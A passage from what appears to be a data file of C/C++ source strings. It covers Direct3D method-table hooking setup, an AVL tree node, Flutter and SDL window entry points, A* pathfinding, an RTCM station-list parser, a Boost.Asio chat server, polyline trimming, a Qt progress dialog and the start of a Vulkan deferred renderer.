0;\n\t\t\t\tparams.AutoDepthStencilFormat = D3DFMT_UNKNOWN;\n\t\t\t\tparams.Flags = NULL;\n\t\t\t\tparams.FullScreen_RefreshRateInHz = 0;\n\t\t\t\tparams.PresentationInterval = 0;\n\n\t\t\t\tLPDIRECT3DDEVICE9 device;\n\t\t\t\tif (direct3D9->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, window, D3DCREATE_SOFTWARE_VERTEXPROCESSING | D3DCREATE_DISABLE_DRIVER_MANAGEMENT, &params, &device) < 0)\n\t\t\t\t{\n\t\t\t\t\tdirect3D9->Release();\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::UnknownError;\n\t\t\t\t}\n\n\t\t\t\tg_methodsTable = (uint150_t*)::calloc(119, sizeof(uint150_t));\n\t\t\t\t::memcpy(g_methodsTable, *(uint150_t**)device, 119 * sizeof(uint150_t));\n\n#if KIERO_USE_MINHOOK\n\t\t\t\tMH_Initialize();\n#endif\n\n\t\t\t\tdirect3D9->Release();\n\t\t\t\tdirect3D9 = NULL;\n\n\t\t\t\tdevice->Release();\n\t\t\t\tdevice = NULL;\n\n\t\t\t\tg_renderType = RenderType::D3D9;\n\n\t\t\t\t::DestroyWindow(window);\n\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\n\t\t\t\treturn Status::Success;\n#endif\n\t\t\t}\n\t\t\telse if (_renderType == RenderType::D3D10)\n\t\t\t{\n#if KIERO_INCLUDE_D3D10\n\t\t\t\tHMODULE libDXGI;\n\t\t\t\tHMODULE libD3D10;\n\t\t\t\tif ((libDXGI = ::GetModuleHandle(KIERO_TEXT(\"dxgi.dll\"))) == NULL || (libD3D10 = ::GetModuleHandle(KIERO_TEXT(\"d3d10.dll\"))) == NULL)\n\t\t\t\t{\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::ModuleNotFoundError;\n\t\t\t\t}\n\n\t\t\t\tvoid* CreateDXGIFactory;\n\t\t\t\tif ((CreateDXGIFactory = ::GetProcAddress(libDXGI, \"CreateDXGIFactory\")) == NULL)\n\t\t\t\t{\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::UnknownError;",
    "#include \"symnode.h\"\r\n\r\nint getHeight(SymNode* node) {\r\n    return (node == nullptr) ? 0 : node->height;\r\n}\r\n\r\nSymNode::SymNode() {\r\n    left = right = par = nullptr;\r\n    height = 1;\r\n}\r\n\r\nSymNode::SymNode(string k) {\r\n    key = k;\r\n    left = right = par = nullptr;\r\n    height = 1;\r\n}\r\n\r\nSymNode* SymNode::LeftLeftRotation() {\r\n    SymNode* newRoot = right;\r\n    right = newRoot->left;\r\n    newRoot->left = this;\r\n    height = max(getHeight(left), getHeight(right)) + 1;\r\n    newRoot->height = max(getHeight(newRoot->left), getHeight(newRoot->right)) + 1;\r\n\r\n    return newRoot;\r\n}\r\n\r\nSymNode* SymNode::RightRightRotation() {\r\n    SymNode* newRoot = left;\r\n    left = newRoot->right;\r\n    newRoot->right = this;\r\n    height = max(getHeight(left), getHeight(right)) + 1;\r\n    newRoot->height = max(getHeight(newRoot->left), getHeight(newRoot->right)) + 1;\r\n\r\n    return newRoot;\r\n}\r\n\r\nSymNode* SymNode::LeftRightRotation() {\r\n    right = right->RightRightRotation();\r\n    return LeftLeftRotation();\r\n}\r\n\r\nSymNode* SymNode::RightLeftRotation() {\r\n    left = left->LeftLeftRotation();\r\n    return RightRightRotation();\r\n}\r\n\r\nSymNode::~SymNode() {\r\n     if (left != nullptr) {\r\n        delete left;\r\n    }\r\n    if (right != nullptr) {\r\n        delete right;\r\n    }\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"chat_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"a_star.h\"\n\n#include <algorithm>\n\n\nAStar::~AStar() {\n  clearAllNodes();\n}\n\nvoid AStar::clearAllNodes() {\n  for (Node *node: allNodes) {\n    delete node;\n  }\n  allNodes.clear();\n}\n\nNode *AStar::getNode(const Vector2 &pos, Node *parent) {\n  for (Node *node: allNodes) {\n    if (node->getX() == pos.getX() && node->getY() == pos.getY()) {\n      return node;\n    }\n  }\n  auto node = new Node(pos, parent);\n  allNodes.push_back(node);\n  return node;\n}\n\nint AStar::getDistanceToPoint(const Node *a, const Vector2 &b) {\n  int dx = std::abs(a->getX() - b.getX());\n  int dy = std::abs(a->getY() - b.getY());\n  // dx < dy: priotize straight movement\n  // dx > dy: priotize diagonal movement\n  if (dx < dy) {\n    return 14 * dy + 10 * (dx - dy);\n  }\n  return 14 * dx + 10 * (dy - dx);\n}\n\n\nstd::vector<Vector2> AStar::getPath(const Vector2 &start, const Vector2 &end, std::vector<Vector2> &obstacles,\n                                    bool motion) {\n  if (std::find(obstacles.begin(), obstacles.end(), end) != obstacles.end()) {\n    return {};\n  }\n\n  openList.add(getNode(start, nullptr));\n  Node *current;\n  while (!openList.isEmpty()) {\n    current = openList.removeFirst();\n    closedList.insert(current);\n\n    for (Vector2 &direction: directions) {\n      auto neighbourPos = Vector2(current->getX() + direction.getX(), current->getY() + direction.getY());\n      if (neighbourPos.getX() == end.getX() && neighbourPos.getY() == end.getY()) {\n        current = getNode(neighbourPos, current);\n        goto PathFound;\n      }\n\n      if (std::find(obstacles.begin(), obstacles.end(), neighbourPos) != obstacles.end()) {\n        continue;\n      }\n\n      auto neighbour = getNode(neighbourPos, current);\n\n\n      if (closedList.find(neighbour) != closedList.end()) {\n        continue;\n      }\n\n      int moveCost = current->getG() + 1;\n\n      bool notOpenContains = !openList.contains(neighbour);\n\n      if (moveCost < neighbour->getG() || notOpenContains) {\n        neighbour->setG(moveCost);\n        neighbour->setH(getDistanceToPoint(neighbour, end));\n        neighbour->setParent(current);\n\n        if (notOpenContains) {\n          openList.add(neighbour);\n        } else {\n          openList.updateItem(neighbour);\n        }\n      }\n    }\n  }\n\nPathFound:\n\n  std::vector<Vector2> path;\n  while (current != nullptr) {\n    path.emplace_back(current->getX(), current->getY());\n    current = current->getParent();\n  }\n  if (motion)\n    path = pathToMotion(path);\n\n  std::reverse(path.begin(), path.end());\n\n  openList.clear();\n  closedList.clear();\n  clearAllNodes();\n\n  return path;\n}\n\nstd::vector<Vector2> AStar::pathToMotion(std::vector<Vector2> &path) {\n  std::vector<Vector2> pathWaypoints;\n  int count = 1;\n  Vector2 direction = path[0] - path[1];\n  for (int i = 2; i < path.size(); i++) {\n    if (direction == path[i - 1] - path[i]) {\n      count++;\n    } else {\n      pathWaypoints.emplace_back(direction * count);\n      count = 1;\n      direction = path[i - 1] - (path[i]);\n    }\n  }\n  pathWaypoints.emplace_back(direction * count);\n  return pathWaypoints;\n}\n",
    "/*This source code copyrighted by Lazy Foo' Productions 2004-2024\nand may not be redistributed without written permission.*/\n\n//Using SDL and standard IO\n#include <SDL.h>\n#include <stdio.h>\n\n//Screen dimension constants\nconst int SCREEN_WIDTH = 640;\nconst int SCREEN_HEIGHT = 480;\n\nint main(int argc, char* args[])\n{\n\t//The window we'll be rendering to\n\tSDL_Window* window = NULL;\n\n\tprintf(\"hello world\");\n\t\n\t\n\n\t//The surface contained by the window\n\tSDL_Surface* screenSurface = NULL;\n\n\t//Initialize SDL\n\tif (SDL_Init(SDL_INIT_VIDEO) < 0)\n\t{\n\t\tprintf(\"SDL could not initialize! SDL_Error: %s\\n\", SDL_GetError());\n\t}\n\telse\n\t{\n\t\t//Create window\n\t\twindow = SDL_CreateWindow(\"SDL Tutorial\", SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED, SCREEN_WIDTH, SCREEN_HEIGHT, SDL_WINDOW_SHOWN);\n\t\tif (window == NULL)\n\t\t{\n\t\t\tprintf(\"Window could not be created! SDL_Error: %s\\n\", SDL_GetError());\n\t\t}\n\t\telse\n\t\t{\n\t\t\t//Get window surface\n\t\t\tscreenSurface = SDL_GetWindowSurface(window);\n\n\t\t\t//Fill the surface white\n\t\t\tSDL_FillRect(screenSurface, NULL, SDL_MapRGB(screenSurface->format, 0xFF, 0xFF, 0xFF));\n\n\t\t\t//Update the surface\n\t\t\tSDL_UpdateWindowSurface(window);\n\n\t\t\t//Hack to get window to stay up\n\t\t\tSDL_Event e; bool quit = false; while (quit == false) { while (SDL_PollEvent(&e)) { if (e.type == SDL_QUIT) quit = true; } }\n\t\t}\n\t}\n\n\t//Destroy window\n\tSDL_DestroyWindow(window);\n\n\t//Quit SDL subsystems\n\tSDL_Quit();\n\n\treturn 0;\n}\n",
    "// test_rtcm.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\n#include <vector>\n#include <map>\n#include <string>\n\n#define MAXFIELD 100\n\nstatic int parse_fields(char* const buffer, char** val)\n{\n    char* p, * q;\n    int n = 0;\n\n    /* parse fields */\n    for (p = buffer; *p && n < MAXFIELD; p = q + 1) {\n        if (p == NULL) break;\n        if ((q = strchr(p, ';')) || (q = strchr(p, '\\n')) || (q = strchr(p, '\\r'))) {\n            val[n++] = p; *q = '\\0';\n        }\n        else break;\n    }\n    return n;\n}\n\nstatic void set_output_file_name(const char* fname, const char* key, char* outfname)\n{\n    char filename[255] = { 0 }, outfilename[255] = { 0 };\n    strcpy(filename, fname);\n    char* temp = strrchr(filename, '.');\n    if (temp) temp[0] = '\\0';\n    sprintf(outfname, \"%s-%s\", filename, key);\n}\n\n\nstatic FILE* set_output_file(const char* fname, const char* key)\n{\n    char filename[255] = { 0 };\n    set_output_file_name(fname, key, filename);\n    return fopen(filename, \"w\");\n}\n\nstruct mount_t\n{\n    std::string name;\n    double lat;\n    double lon;\n    int freq;\n    std::string sys;\n    std::string rcv;\n    std::string country;\n};\n\nstatic void read_st(const char* fname, std::map<std::string, mount_t>& mMount)\n{\n    FILE* fLOG = fopen(fname, \"rt\");\n\n    if (fLOG ==NULL) return;\n\n\n    char buffer[255] = { 0 };\n    char* val[MAXFIELD];\n\n    int line_index = 0;\n\n    while (fLOG && !feof(fLOG))\n    {\n        fgets(buffer, sizeof(buffer), fLOG);\n        if (!(buffer[0] == 'S' && buffer[1] == 'T' && buffer[2] == 'R')) continue;\n        int num = parse_fields(buffer, val);\n        if (num < 14) continue;\n\n        std::string name = std::string(val[1]);\n        int freq = atoi(val[5]);\n        std::string sys = std::string(val[6]);\n        std::string country = std::string(val[8]);\n        double lat = atof(val[9]);\n        double lon = atof(val[10]);\n        std::string rcv = std::string(val[13]);\n\n        mount_t mount;\n        mount.freq = freq;\n        mount.country = country;\n        mount.sys = sys;\n        mount.rcv = rcv;\n        mount.lat = lat;\n        mount.lon = lon;\n        mount.name = name;\n\n        mMount[name] = mount;\n\n    }\n    if (fLOG) fclose(fLOG);\n    return;\n}\n\nint main(int argc, const char* argv[])\n{\n    std::map<std::string, mount_t> mMount;\n    if (argc > 1)\n        read_st(argv[1], mMount);\n\n    if (mMount.size()>0)\n    {\n        FILE* fOUT1 = set_output_file(argv[1], \"-st.csv\");\n        if (fOUT1) fprintf(fOUT1, \"name,lat,lon,country,constellation,receiver type\\n\");\n        for (std::map<std::string, mount_t>::iterator pMount = mMount.begin(); pMount != mMount.end(); ++pMount)\n        {\n            if (fOUT1) fprintf(fOUT1, \"%20s,%8.4f,%8.4f,%s,%s,%s\\n\", pMount->first.c_str(), pMount->second.lat, pMount->second.lon, pMount->second.country.c_str(), pMount->second.sys.c_str(), pMount->second.rcv.c_str());\n        }\n        if (fOUT1) fclose(fOUT1);\n    }\n    return 0;\n}\n\n",
    "#include \"server.hpp\"\n\nnamespace\n{\n\nvoid SignalHandler( int signal )\n{\n    switch ( signal )\n    {\n        case SIGINT:\n        {\n            DEBUG_PRINT( \"SIGINT received\" );\n            break;\n        }\n        case SIGQUIT:\n        {\n            DEBUG_PRINT( \"SIGQUIT received\" );\n            break;\n        }\n        default:\n        {\n            break;\n        }\n    }\n\n    std::cout << \"Press Enter to stop the server.\" << std::endl;\n}\n\n} // anonymous namespace\n\nint main( int argc, char* argv[] )\n{\n    try\n    {\n        if ( argc != 2 )\n        {\n            std::cerr << \"Usage: chat_server <port>\" << std::endl;\n            return 1;\n        }\n\n        using namespace server;\n\n        boost::asio::io_context io_context;\n        tcp::endpoint endpoint( tcp::v6(), std::atoi( argv[1] ) );\n\n        auto server = std::make_shared<ChatServer>( io_context, endpoint );\n\n        std::thread serverThread( [&io_context]() { io_context.run(); } );\n\n        if ( std::signal( SIGINT, SignalHandler ) == SIG_ERR ||\n             std::signal( SIGQUIT, SignalHandler ) == SIG_ERR )\n        {\n            std::cerr << \"Cannot set signal handler\" << std::endl;\n        }\n\n        std::cout << \"Press Enter to stop the server.\" << std::endl;\n        std::cin.get();\n        server->Close();\n\n        serverThread.join();\n    }\n    catch ( std::exception& e )\n    {\n        std::cerr << \"Exception: \" << e.what() << std::endl;\n    }\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"music_player\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <cmath>\n#include <vector>\n\nusing namespace std;\n\nusing Point = pair<double, double>;\nusing Polyline = vector<Point>;\n\nvoid PrintPolyline(Polyline& polyline) {\n    int size = polyline.size();\n    std::cout << \"[\";\n    for (int i=0; i<size; i++) {\n        std::cout << \"(\" << polyline[i].first << \", \"\n                         << polyline[i].second << \"), \";\n    }\n    std::cout << std::endl;\n}\n\ndouble GetDistance(const Point& p1, const Point& p2) {\n    double dx = p2.first - p1.first;\n    double dy = p2.second - p1.second;\n    return hypot(dx, dy);\n}\n\ndouble GetDirection(const Point& p1, const Point& p2) {\n    double dx = p2.first - p1.first;\n    double dy = p2.second - p1.second;\n    return atan2(dy, dx);\n}\n\nPoint GetPointOnLine(Point& start, double direction, double distance) {\n    return std::make_pair(start.first + distance * cos(direction),\n                          start.second + distance * sin(direction));\n}\n\nPolyline GetTrimPointsOnPolyline(const Polyline& polyline, \n                                 const double trim_distance) {\n    int polyline_size = polyline.size();\n    if (polyline_size == 1) return polyline;\n    Polyline result;\n    result.push_back(polyline[0]);\n    \n    int i = 1;\n    Point curr = polyline[i-1];\n\n    while (i < polyline_size) {\n        double remaining_distance = trim_distance;\n        while(remaining_distance != 0) {\n            if (i >= polyline_size) break;\n            double direction = GetDirection(curr, polyline[i]);\n            double distance = GetDistance(curr, polyline[i]);\n\n            if (distance >= remaining_distance) {\n                Point p = GetPointOnLine(curr, direction, remaining_distance);\n                result.push_back(p);\n                curr = p;\n                remaining_distance = 0;\n            } else {\n                remaining_distance -= distance;\n                curr = polyline[i];\n                i++;\n            }\n        }\n    }\n    return result;\n}\n\nint main() {\n    // Polyline polyline{{0, 0}, {3, 0}, {3, 1}, {4, 1}, {6, 3}, {8, 3}};\n    Polyline polyline{{0, 0}, {12, 0}};\n    // Polyline polyline{{0, 0}, {1, 0}};\n    double distance = 2;\n    Polyline result = GetTrimPointsOnPolyline(polyline, distance);\n    PrintPolyline(result);\n}",
    "\ufeff#include \"GFE_ProgDlg_Simple.h\"\n#include \"ui_GFE_ProgDlg_Simple.h\"\n#include <QLabel>\n#include <QThread>\n#include <QMessageBox>\n#include <QCheckBox>\n#include \"GFE_ProgDlg_Thread.h\"\n#include <QFile>\n//#include \"Frame/Application.h\"\n\nGFE_ProgDlg_Simple::GFE_ProgDlg_Simple(QWidget *parent) :\n    GFE_Dialog(parent),\n    ui(new Ui::GFE_ProgDlg_Simple)\n{\n    ui->setupUi(this);\n    QFile qss(\":/Res/QSS/Common.qss\");\n    qss.open(QFile::ReadOnly);\n    this->setStyleSheet(qss.readAll());\n    qss.close();\n    this->setWindowFlags(Qt::Window | Qt::WindowTitleHint | Qt::CustomizeWindowHint);\n    connect(ui->pbClose, &QPushButton::clicked, this, &GFE_ProgDlg_Simple::__Stop);\n    connect(ui->pbRetry, &QPushButton::clicked, this, &GFE_ProgDlg_Simple::Retry);\n    connect(this, &GFE_ProgDlg_Simple::ToUpdate, this, &GFE_ProgDlg_Simple::__Update);\n    connect(this, &GFE_ProgDlg_Simple::ToFinish, this, &GFE_ProgDlg_Simple::__Finish);\n\n    ui->pbRetry->hide();\n}\n\nGFE_ProgDlg_Simple::~GFE_ProgDlg_Simple()\n{\n    delete ui;\n}\n\nGFE_ProgDlg_Simple* GFE_ProgDlg_Simple::GlobalInstance()\n{\n//    static auto instance = new GFE_ProgDlg_Simple(App::Get());\n    static auto instance = new GFE_ProgDlg_Simple();\n    return instance;\n}\n\nvoid GFE_ProgDlg_Simple::Init(bool isInfinite)\n{\n    auto item = ui->widget;\n    item->Init();\n    item->circle->setMaximum(isInfinite ? 0 : 10000);\n    item->circle->setValue(0);\n    item->UpdateText(tr(\"Initialized\"));\n    ui->pbClose->setText(tr(\"Abort\"));\n\n    result = false;\n    _isSubsequent = false;\n    _toAbort = false;\n    _isInfinite = isInfinite;\n}\n\nvoid GFE_ProgDlg_Simple::Start(const std::function<void ()>& routine)\n{\n    //_thread.reset(QThread::create(routine)); //!\u4fee\u6539\n    _thread.reset(GFE_ProgDlg_Thread::create(routine));\n    //!\u8fde\u63a5\u7ebf\u7a0b\u6062\u590d\u548c\u505c\u6b62\u7684\u4fe1\u53f7\u548c\u69fd\n    connect(this, &GFE_ProgDlg_Simple::ResumeSignal, _thread.get(), &GFE_ProgDlg_Thread::toResumePause);\n    connect(this, &GFE_ProgDlg_Simple::StopSignal, _thread.get(), &GFE_ProgDlg_Thread::toStopPause);\n    // auto conn_update = connect(this, &GFE_ProgDlg_Simple::ToUpdate, this, &GFE_ProgDlg_Simple::__Update);\n    // auto conn_finish = connect(this, &GFE_ProgDlg_Simple::ToFinish, this, &GFE_ProgDlg_Simple::__Finish);\n    connect(_thread.get(), &GFE_ProgDlg_Thread::finished, this, [=] {\n        auto state = _thread->state();\n        if(state == GFE_ProgDlg_Thread::Crash) {\n            // \u5904\u7406\u5d29\u6e83\n            resize(400, height());\n            Finish(1, tr(\"The thread stopped due to an unknown error.\\n\"\n                         \"\\n\"\n                         \"To assist us in enhancing the application, please send the \"\n                         \"PrePo.dmp file from the program's direcotry,which will provide \"\n                         \"essential information for resolving the issue.\"));\n        }\n        else if(state == GFE_ProgDlg_Thread::Abort) {\n            // \u5904\u7406\u624b\u52a8\u4e2d\u6b62\n            GFE_Dialog::close();\n            ui->pbClose->setHidden(false);\n        }\n        // disconnect(conn_update);\n        // disconnect(conn_finish);\n    });\n    _thread->start();\n    exec();\n}\n\nvoid GFE_ProgDlg_Simple::Update(double rate, const QString& msg)\n{\n    if(_toAbort && QThread::currentThread() != QCoreApplication::instance()->thread())\n        throw ThreadAbortException();\n\n    if(_isInfinite && !std::isnan(rate))\n        emit ToUpdate(rate, QString(msg).append(\" (%1%)\").arg(rate*100, 0, 'f', 2));\n    else\n        emit ToUpdate(rate, msg);\n}\n\nvoid GFE_ProgDlg_Simple::Update(size_t left, size_t right, const QString& msg)\n{\n    if(_toAbort && QThread::currentThread() != QCoreApplication::instance()->thread())\n        throw ThreadAbortException();\n\n    auto rate = (double)left/(double)right;\n    if(_isInfinite && !std::isnan(rate))\n        emit ToUpdate(rate, QString(msg).append(\" (%1/%2)\").arg(left).arg(right));\n    else\n        emit ToUpdate(rate, msg);\n}\n\nvoid GFE_ProgDlg_Simple::Finish(int status, const QString& errMsg)\n{\n    // \u624b\u52a8\u4e2d\u6b62\u4e0d\u9700\u8981\u89e6\u53d1__Finish\n    if(_toAbort && QThread::currentThread() != QCoreApplication::instance()->thread())\n        throw ThreadAbortException();\n\n    // \u9664\u624b\u52a8\u4e2d\u6b62\u5916\uff0c\u5176\u4ed6\u7ed3\u675f\u72b6\u6001\uff0c\u9700\u8981\u5148\u53d1\u9001ToFinish\u4fe1\u53f7\u8ba9UI\u505a\u76f8\u5e94\u52a8\u4f5c\uff08\u5f02\u6b65\uff09\uff0c\u540c\u65f6\u7ebf\u7a0b\u81ea\u8eab\u5f00\u59cb\u51c6\u5907\u9000\u51fa\u6216\u6682\u505c\n    emit ToFinish(status, errMsg);\n    switch(status) {\n    case Success:\n    case Failed:\n    case FailedRetry:\n    {\n        if(QThread::currentThread() != QCoreApplication::instance()->thread())\n            throw ThreadExitException();\n        break;\n    }\n    case Warning:\n    case Pause:\n    {\n        //! \u4e0d\u4e3a\u540e\u7eed\u8b66\u544a\u6267\u884c\u76f8\u540c\u64cd\u4f5c\u65f6\uff0c\u6682\u505c\u7ebf\u7a0b\n        if(!_isSubsequent)\n            _thread->pause();\n        break;\n    }\n    }\n}\n\nvoid GFE_ProgDlg_Simple::SetCanAbort(bool f)\n{\n    //    ui->pbClose->setEnabled(f);\n    if(f) ui->pbClose->setHidden(false);\n    else ui->pbClose->setHidden(true);\n}\n\nvoid GFE_ProgDlg_Simple::__Update(double rate, const QString& msg)\n{\n    auto item = ui->widget;\n    if(!std::isnan(rate))\n        item->circle->setValue(rate*10000);\n    item->UpdateText(msg);\n}\n\n\nvoid GFE_ProgDlg_Simple::__Finish(int status, const QString& errMsg)\n{\n    ",
    "#include \"ModernDeferredRenderer.hpp\"\n#include \"ModernDeferredPipeline.hpp\"\n\n#include \"Vulkan/Buffer.hpp\"\n#include \"Vulkan/Device.hpp\"\n#include \"Vulkan/FrameBuffer.hpp\"\n#include \"Vulkan/PipelineLayout.hpp\"\n#include \"Vulkan/RenderPass.hpp\"\n#include \"Vulkan/SwapChain.hpp\"\n#include \"Vulkan/Window.hpp\"\n#include \"Vulkan/ImageMemoryBarrier.hpp\"\n#include \"Vulkan/PipelineCommon/CommonComputePipeline.hpp\"\n#include \"Assets/Model.hpp\"\n#include \"Assets/Scene.hpp\"\n#include \"Assets/UniformBuffer.hpp\"\n#include \"Utilities/Exception.hpp\"\n#include <array>\n\nnamespace Vulkan::ModernDeferred {\n\nModernDeferredRenderer::ModernDeferredRenderer(const WindowConfig& windowConfig, const VkPresentModeKHR presentMode, const bool enableValidationLayers) :\n\tVulkan::VulkanBaseRenderer(windowConfig, presentMode, enableValidationLayers)\n{\n\t\n}\n\nModernDeferredRenderer::~ModernDeferredRenderer()\n{\n\tModernDeferredRenderer::DeleteSwapChain();\n}\n\nvoid ModernDeferredRenderer::CreateSwapChain()\n{\n\tVulkan::VulkanBaseRenderer::CreateSwapChain();\n\t\n\tconst auto extent = SwapChain().Extent();\n\tconst auto format = SwapChain().Format();\n\n\tvisibilityPipeline_.reset(new VisibilityPipeline(SwapChain(), DepthBuffer(), UniformBuffers(), GetScene()));\n\t\n\tvisibilityBufferImage_.reset(new Image(Device(), extent,\n\t\tVK_FORMAT_R32G32_UINT, VK_IMAGE_TILING_OPTIMAL,\n\t\tVK_IMAGE_USAGE_STORAGE_BIT | VK_IMAGE_USAGE_COLOR_ATTACHMENT_BIT));\n\tvisibilityBufferImageMemory_.reset(\n\t\tnew DeviceMemory(visibilityBufferImage_->AllocateMemory(VK_MEMORY_PROPERTY_DEVICE_LOCAL_BIT)));\n\tvisibilityBufferImageView_.reset(new ImageView(Device(), visibilityBufferImage_->Handle(),\n\t\tVK_FORMAT_R32G32_UINT,\n\t\tVK_IMAGE_ASPECT_COLOR_BIT));\n\n\toutputImage_.reset(new Image(Device(), extent, format,\n\t\tVK_IMAGE_TILING_OPTIMAL,\n\t\tVK_IMAGE_USAGE_STORAGE_BIT | VK_IMAGE_USAGE_TRANSFER_SRC_BIT));\n\toutputImageMemory_.reset(\n\t\tnew DeviceMemory(outputImage_->AllocateMemory(VK_MEMORY_PROPERTY_DEVICE_LOCAL_BIT)));\n\toutputImageView_.reset(new ImageView(Device(), outputImage_->Handle(),\n\t\tformat,\n\t\tVK_IMAGE_ASPECT_COLOR_BIT));\n\t\n\tmotionVectorImage_.reset(new Image(Device(), extent, VK_FORMAT_R32G32_SFLOAT,\n\t\tVK_IMAGE_TILING_OPTIMAL,\n\t\tVK_IMAGE_USAGE_STORAGE_BIT));\n\tmotionVectorImageMemory_.reset(\n\t\tnew DeviceMemory(motionVectorImage_->AllocateMemory(VK_MEMORY_PROPERTY_DEVICE_LOCAL_BIT)));\n\tmotionVectorImageView_.reset(new ImageView(Device(), motionVectorImage_->Handle(),\n\t\tVK_FORMAT_R32G32_SFLOAT,\n\t\tVK_IMAGE_ASPECT_COLOR_BIT));\n\t\n\t\n\tdeferredFrameBuffer_.reset(new FrameBuffer(*visibilityBufferImageView_, visibilityPipeline_->RenderPass()));\n\tdeferredShadingPipeline_.reset(new ShadingPipeline(SwapChain(), *visibilityBufferImageView_, *outputImageView_, *motionVectorImageView_, UniformBuffers(), GetScene()));\n\n\tconst auto& debugUtils = Device().DebugUtils();\n\tdebugUtils.SetObjectName(outputImage_->Handle(), \"Output Image\");\n\tdebugUtils.SetObjectName(visibilityBufferImage_->Handle(), \"Visibility Image\");\n\n}\n\nvoid ModernDeferredRenderer::DeleteSwapChain()\n{\n\tvisibilityPipeline_.reset();\n\tdeferredShadingPipeline_.reset();\n\taccumulatePipeline_.reset();\n\t\n\tdeferredFrameBuffer_.reset();\n\n\tvisibilityBufferImage_.reset();\n\tvisibilityBufferImageMemory_.reset();\n\tvisibilityBufferImageView_.reset();\n\n\toutputImage_.reset();\n\toutputImageMemory_.reset();\n\toutputImageView_.reset();\n\t\n\tmotionVectorImage_.reset();\n\tmotionVectorImageMemory_.reset();\n\tmotionVectorImageView_.reset();\n\n\tVulkan::VulkanBaseRenderer::DeleteSwapChain();\n}\n\nvoid ModernDeferredRenderer::Render(VkCommandBuffer commandBuffer, uint32_t imageIndex)\n{\n\t\n\tVkImageSubresourceRange subresourceRange = {};\n\tsubresourceRange.aspectMask = VK_IMAGE_ASPECT_COLOR_BIT;\n\tsubresourceRange.baseMipLevel = 0;\n\tsubresourceRange.levelCount = 1;\n\tsubresourceRange.baseArrayLayer = 0;\n\tsubresourceRange.layerCount = 1;\n\n\tImageMemoryBarrier::Insert(commandBuffer, visibilityBufferImage_->Handle(), subresourceRange,\n\t\t0, VK_ACCESS_COLOR_ATTACHMENT_WRITE_BIT, VK_IMAGE_LAYOUT_UNDEFINED,\n\t\tVK_IMAGE_LAYOUT_COLOR_ATTACHMENT_OPTIMAL);\n\t\t\t   \n\tstd::array<VkClearValue, 2> clearValues = {};\n\tclearValues[0].color = { {0.0f, 0.0f, 0.0f, 1.0f} };\n\tclearValues[1].depthStencil = { 1.0f, 0 };\n\n\tVkRenderPassBeginInfo renderPassInfo = {};\n\trenderPassInfo.sType = VK_STRUCTURE_TYPE_RENDER_PASS_BEGIN_INFO;\n\trenderPassInfo.renderPass = visibilityPipeline_->RenderPass().Handle();\n\trenderPassInfo.framebuffer = deferredFrameBuffer_->Handle();\n\trenderPassInfo.renderArea.offset = { 0, 0 };\n\trenderPassInfo.renderArea.extent = SwapChain().Extent();\n\trenderPassInfo.clearValueCount = static_cast<uint32_t>(clearValues.size());\n\trenderPassInfo.pClearValues = clearValues.data();\n\n\t\n\t{\n\t\tSCOPED_GPU_TIMER(\"drawpass\");\n\t\t// make it to generate gbuffer\n\t\tvkCmdBeginRenderPass(commandBuffer, &renderPassInfo, VK_SUBPASS_CONTENTS_INLINE);\n\t\t{\n\t\t\tconst auto& scene = 